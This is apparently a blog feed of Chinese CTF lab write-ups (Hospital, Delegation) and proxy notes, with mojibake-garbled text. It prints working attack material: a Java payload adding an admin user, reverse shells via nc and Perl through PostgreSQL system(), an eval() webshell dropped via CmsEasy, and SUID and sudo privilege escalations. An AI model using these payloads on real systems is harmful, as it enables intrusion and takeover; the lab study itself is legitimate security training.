·çš„ï¼Œåªä¸è¿‡è¿™æ¬¡æˆ‘ä»¬ä¼šå°†win1å½“ä½œæœåŠ¡ç«¯ï¼Œwin2å½“ä½œå®¢æˆ·ç«¯ï¼Œå†æ‰§è¡Œä¸€æ¬¡ä¸Šé¢æ­å»ºfrpçš„æ“ä½œï¼Œå³å¯æ­å»ºå¥½ç¬¬äºŒå±‚ä»£ç†ã€‚æ‰€ä»¥ï¼Œå¦‚æœæƒ³ç”¨frpæ­å»ºä¸¤å±‚ä»£ç†ï¼Œwin1éœ€è¦ä¸Šä¼ ä¸¤ä¸ªä¸œè¥¿ï¼Œä¸€ä¸ªæ˜¯ç¬¬ä¸€å±‚ä»£ç†çš„frpc(å®¢æˆ·ç«¯)ï¼Œä¸€ä¸ªæ˜¯ç¬¬äºŒå±‚ä»£ç†çš„frps(æœåŠ¡ç«¯)</p><h3 id="å¦‚ä½•ä½¿ç”¨ï¼Ÿ">å¦‚ä½•ä½¿ç”¨ï¼Ÿ</h3><h4 id="proxifier-2">proxifier</h4><p>ç‚¹å¼€ä»£ç†æœåŠ¡å™¨é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä»£ç†é“¾ç•Œé¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824021946015.png" alt="image-20240824021946015"></p><p>æˆ‘ä»¬å¯ä»¥ç‚¹å‡»åˆ›å»ºä¸€ä¸ªæ–°çš„åä¸ºNew proxyçš„ä»£ç†é“¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824022031705.png" alt="image-20240824022031705"></p><p>æ ¹æ®æ‹“è¡¥å›¾çš„ä»£ç†æ­å»ºé¡ºåºï¼Œå°†ä¸Šé¢çš„ä»£ç†ä¸€ä¸ªä¸€ä¸ªæ‹–ä¸‹æ¥å³å¯æˆåŠŸæ„é€ ä»£ç†é“¾ï¼Œå…¥ä¸‹å›¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824022111785.png" alt="image-20240824022111785"></p><p>ç„¶åè¿”å›åˆ°åˆå§‹ç•Œé¢ï¼Œå°†ä»£ç†è§„åˆ™é‡Œé¢çš„åŠ¨ä½œé€‰æ‹©ä¸ºæˆ‘ä»¬åˆšåˆ›å»ºå¥½çš„ä»£ç†é“¾å³å¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824022133180.png" alt="image-20240824022133180"></p><h4 id="proxychains4-2">proxychains4</h4><p>proxychains4é…ç½®ç›¸å¯¹ç®€å•ï¼Œåœ¨ç¬¬ä¸€å±‚ä»£ç†çš„ä¸‹é¢å†™ä¸Šç¬¬äºŒå±‚ä»£ç†çš„ipå’Œç«¯å£å³å¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824022312129.png" alt="image-20240824022312129"></p><h2 id="æ€»ç»“">æ€»ç»“</h2><p>åœ¨é¶åœºç¯å¢ƒï¼Œå¯¹äºä¸€å±‚ä»£ç†å’Œç™¾åˆ†ä¹‹90çš„å¤šå±‚ä»£ç†ï¼Œgostå®Œå…¨å¯ä»¥èƒœä»»ï¼Œæ€»ç»“ä¸€å¥è¯å°±æ˜¯æˆ˜æ–—çˆ½ï¼Œä¼ ä¸Šå»ä¸€æ¡å‘½ä»¤æ­èµ·æ¥å°±æ˜¯å¹²ã€‚é‚£å¦å¤–çš„ç™¾åˆ†ä¹‹10æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿé’ˆå¯¹äºgostçš„å¤šå±‚ä»£ç†ï¼Œä»–éœ€è¦ä½¿ç”¨ä»£ç†é“¾çš„æ–¹å¼è¿›è¡Œè¿æ¥ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦å¤šä¸ªipå’Œç«¯å£ï¼Œå¦‚æœæŸäº›æ¼æ´åœ¨å†…ç½‘ï¼Œä¸”åªèƒ½å…è®¸è®¾ç½®ä¸€ä¸ªipå’Œç«¯å£ï¼Œé‚£è¿™å°±å°´å°¬äº†ã€‚è§£å†³æ–¹æ³•æœ‰ä¸¤ç§ï¼Œ1.ç”¨CSæ­å»ºä»£ç†ï¼ŒCSçš„å¤šå±‚ä»£ç†ä¼šé›†æˆä¸ºä¸€å¯¹ipå’Œç«¯å£ï¼Œ2.ä½¿ç”¨kengwangå¸ˆå‚…æ¨èçš„stowawayä»£ç†ï¼Œå®ƒä¹Ÿä¼šå°†å¤šå±‚ä»£ç†é›†æˆä¸ºä¸€å¯¹ipå’Œç«¯å£ã€‚</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Hospital</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Hospital.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Hospital.html</id>
    <published>2024-08-20T18:03:54.184Z</published>
    <updated>2024-08-20T18:05:15.709Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Hospital</h1><h2 id="flag01">flag01</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">39.101.178.126:22</span> open</span><br><span class="line"><span class="number">39.101.178.126:8080</span> open</span><br><span class="line"><span class="string">[*]</span> alive ports len is: <span class="number">2</span></span><br><span class="line">start vulscan</span><br><span class="line"><span class="string">[*]</span> WebTitle http://<span class="number">39</span>.<span class="number">101</span>.<span class="number">178</span>.<span class="number">126</span>:<span class="number">8080</span> code:<span class="number">302</span> len:<span class="number">0</span>      title:None è·³è½¬url: http://<span class="number">39</span>.<span class="number">101</span>.<span class="number">178</span>.<span class="number">126</span>:<span class="number">8080</span>/login;jsessionid=1B14C65F6F2FBDDB6219E0E9C43CCB61</span><br><span class="line"><span class="string">[*]</span> WebTitle http://<span class="number">39</span>.<span class="number">101</span>.<span class="number">178</span>.<span class="number">126</span>:<span class="number">8080</span>/login;jsessionid=1B14C65F6F2FBDDB6219E0E9C43CCB61 code:<span class="number">200</span> len:<span class="number">2005</span>   title:åŒ»ç–—ç®¡ç†åå°</span><br><span class="line"><span class="string">[+]</span> PocScan http://<span class="number">39</span>.<span class="number">101</span>.<span class="number">178</span>.<span class="number">126</span>:<span class="number">8080</span> poc-yaml-spring-actuator-heapdump-file</span><br></pre></td></tr></table></figure><p>shiroæ³¨å…¥å†…å­˜é©¬æ‹¿ä¸‹ç¬¬ä¸€å±‚shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vim.basic</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨vimæ‹¿ä¸‹ç¬¬ä¸€å±‚shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /root/flag/flag01.txt</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 172.30.12.5     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.30.12.6     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.30.12.236   is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 3</span></span><br><span class="line"><span class="string">172.30.12.236:8080 open</span></span><br><span class="line"><span class="string">172.30.12.5:8080 open</span></span><br><span class="line"><span class="string">172.30.12.6:445 open</span></span><br><span class="line"><span class="string">172.30.12.6:139 open</span></span><br><span class="line"><span class="string">172.30.12.6:135 open</span></span><br><span class="line"><span class="string">172.30.12.236:22 open</span></span><br><span class="line"><span class="string">172.30.12.5:22 open</span></span><br><span class="line"><span class="string">172.30.12.6:8848 open</span></span><br><span class="line"><span class="string">172.30.12.5:10001 open</span></span><br><span class="line"><span class="string">172.30.12.236:8009 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 10</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetBios: 172.30.12.6     WORKGROUP\SERVER02             </span></span><br><span class="line"><span class="string">[*] NetInfo:</span></span><br><span class="line"><span class="string">[*]172.30.12.6</span></span><br><span class="line"><span class="string">   [-&gt;]Server02</span></span><br><span class="line"><span class="string">   [-&gt;]172.30.12.6</span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.30.12.5:10001  code:400 len:0      title:None</span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.30.12.5:8080   code:302 len:0      title:None è·³è½¬url: http://172.30.12.5:8080/login;jsessionid=8FD2B000A50D684849910F4CFB0F725B</span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.30.12.5:8080/login;jsessionid=8FD2B000A50D684849910F4CFB0F725B code:200 len:2005   title:åŒ»ç–—ç®¡ç†åå°</span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.30.12.236:8080 code:200 len:3964   title:åŒ»é™¢åå°ç®¡ç†å¹³å°</span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 â€“ Not Found</span></span><br><span class="line"><span class="string">[+] http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span></span><br><span class="line"><span class="string">[+] http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span></span><br><span class="line"><span class="string">[+] http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file</span></span><br></pre></td></tr></table></figure><p>å…ˆæ‰“nacosï¼Œä¸‹ä¸€ä¸ªNacosExploitGUI</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240704112851592.png" alt="image-20240704112851592"></p><p>åœ¨å‰é¢æ‹¿åˆ°çš„linuxæœºå™¨ä¸Šå†™å…¥sshå¯†é’¥ï¼Œè·å–rootæƒé™ï¼Œå†ç”¨rootå¼€å¯httpæœåŠ¡ï¼Œä¸Šä¼ æ¶æ„jaråŒ…ï¼Œåˆ›å»ºæ–°ç”¨æˆ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Runtime.getRuntime().exec(&quot;ping -c 4 `whoami`.xxx.dnslog.cn&quot;);</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;net user Chu0 whoamI@666 /add&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;net localgroup administrators Chu0 /add&quot;</span>);</span><br><span class="line">        <span class="comment">// Runtime.getRuntime().exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/vps/9999 0&gt;&amp;1&quot;);</span></span><br><span class="line">        <span class="comment">// Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/vps/9999 0&gt;&amp;1&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.30</span>.<span class="number">12.6</span>:<span class="number">8848</span><span class="regexp">/nacos/</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240717185443355.png" alt="image-20240717185443355"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240704112950143.png" alt="image-20240704112950143"></p><p>åé¢å°±æ˜¯rdpä¸Šå»æ‹¿flagäº†</p><h2 id="flag03">flag03</h2><p><a href="http://172.30.12.5:8080">http://172.30.12.5:8080</a></p><p>æ‰“çš„æ˜¯ä¸€ä¸ªfjçš„æ¼æ´ï¼Œbpæ’ä»¶fj_scanæ‰«å‡ºæ¥æ¼æ´ï¼Œç›´æ¥å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240704113819425.png" alt="image-20240704113819425"></p><p>å†™sshå¯†é’¥è¿œç¨‹è¿æ¥</p><h2 id="flag04">flag04</h2><p>v1.1ç‰ˆæœ¬ï¼Œè¿™é‡Œä¸çŸ¥é“ä¸ºå•¥v1.2è¿è¡Œä¼šæŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰«å‡ºæ¥äº†postgresqlçš„è´¦å·å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@web03:/tmp<span class="comment"># ./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000</span></span><br><span class="line">2024/07/04 12:20:59 Target vulnerable has plugin [alertlist]</span><br><span class="line">2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class="line">2024/07/04 12:20:59 There is [0] records <span class="keyword">in</span> db.</span><br><span class="line">2024/07/04 12:20:59 <span class="built_in">type</span>:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123] database:[postgres]     basic_auth_user:[]      basic_auth_password:[]</span><br><span class="line">2024/07/04 12:20:59 All Done, have <span class="built_in">nice</span> day!</span><br></pre></td></tr></table></figure><p>linuxç›´æ¥è¿æ¥ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨æ•°æ®åº“å·¥å…·è¿æ¥ï¼Œä¸è¿‡å¥½åƒè¿ä¸ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 psql -h 172.30.54.12 -p 5432 -U postgres</span><br></pre></td></tr></table></figure><p>ç”±äºéœ€è¦ç”¨psqlææƒï¼Œæ‰€ä»¥å…ˆæ”¹ä¸€ä¸‹rootå¯†ç </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> root <span class="keyword">WITH</span> PASSWORD <span class="string">&#x27;123456&#x27;</span>;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå‘½ä»¤æ‰§è¡Œå‡½æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> <span class="keyword">system</span> (cstring) <span class="keyword">RETURNS</span> <span class="type">integer</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> <span class="string">&#x27;c&#x27;</span> STRICT;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">&#x27;nc -e /bin/sh 172.30.54.179 250&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œnc,bashéƒ½æ²¡æ³•åå¼¹shellï¼Œæ‰€ä»¥ä½¿ç”¨perlè¿›è¡Œæ“ä½œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">&#x27;perl -e \&#x27;</span>use Socket;$i<span class="operator">=</span>&quot;172.30.54.179&quot;;$p<span class="operator">=</span><span class="number">250</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="keyword">open</span>(STDIN,&quot;&gt;&amp;S&quot;);<span class="keyword">open</span>(STDOUT,&quot;&gt;&amp;S&quot;);<span class="keyword">open</span>(STDERR,&quot;&gt;&amp;S&quot;);<span class="keyword">exec</span>(&quot;/bin/sh -i&quot;);&#125;;\<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shellä¹‹åç”±äºéœ€è¦äº¤äº’shellï¼Œæ‰€ä»¥åˆ©ç”¨pythonè·å–äº¤äº’shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>sudo -lå‘ç°psqlå¯ä»¥æ— å¯†ç æ‰§è¡Œsudo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> postgres on web04:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User postgres may run the following commands on web04:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/postgresql/bin/psql</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/usr/</span>local<span class="regexp">/postgresql/</span>bin/psql</span><br></pre></td></tr></table></figure><p>å¯†ç å°±æ˜¯æˆ‘ä»¬åˆšåˆšä¿®æ”¹çš„å¯†ç </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\?</span><br><span class="line">!<span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥è·å¾—rootæƒé™äº†ï¼Œæ‹¿ä¸‹flag</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Delegation</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Delegation.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Delegation.html</id>
    <published>2024-08-20T17:28:27.871Z</published>
    <updated>2024-08-20T17:29:38.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ˜¥ç§‹äº‘å¢ƒ-Delegation"><a href="#æ˜¥ç§‹äº‘å¢ƒ-Delegation" class="headerlink" title="æ˜¥ç§‹äº‘å¢ƒ Delegation"></a>æ˜¥ç§‹äº‘å¢ƒ Delegation</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">39.101.173.163:22 open</span><br><span class="line">39.101.173.163:80 open</span><br><span class="line">39.101.173.163:3306 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.101.173.163     code:200 len:68112  title:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜</span><br></pre></td></tr></table></figure><p>CmsEasy 7.3.8 æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ - ListSec</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.101.173.163</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>77</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded;</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=os9kli93e59pjclq4361kaairm; loginfalse74c6352c5a281ec5947783b8a186e225=1; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line"></span><br><span class="line"><span class="language-php-template"><span class="language-xml">sid=#data_d_.._d_.._d_.._d_2.php&amp;slen=693&amp;scontent=</span><span class="language-php"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>å†™å…¥shellä¹‹åè®¿é—®/2.phpå³å¯ï¼Œè¿æ¥èšå‰‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/diff</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure><p>diffææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff --line-format=%L /dev/null /home/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240821002158248.png" alt="image-20240821002158248"></p><p>æ‹¿åˆ°hint</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WIN19\Adrian</span><br></pre></td></tr></table></figure><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>æ‹¿rockyouçˆ†ç ´ä¸€æ³¢WIN19ï¼Œå…ˆæ­å»ºä»£ç†ï¼Œæ‰«æå†…ç½‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.19:139 open</span><br><span class="line">172.22.4.7:139 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.19:135 open</span><br><span class="line">172.22.4.7:135 open</span><br><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.36:21 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.36:80 open</span><br><span class="line">172.22.4.36:3306 open</span><br><span class="line">172.22.4.36:22 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.19:445 open</span><br><span class="line">172.22.4.7:445 open</span><br><span class="line">172.22.4.7:88 open</span><br><span class="line">[*] NetBios: 172.22.4.45     XIAORANG\WIN19                 </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.4.19</span><br><span class="line">   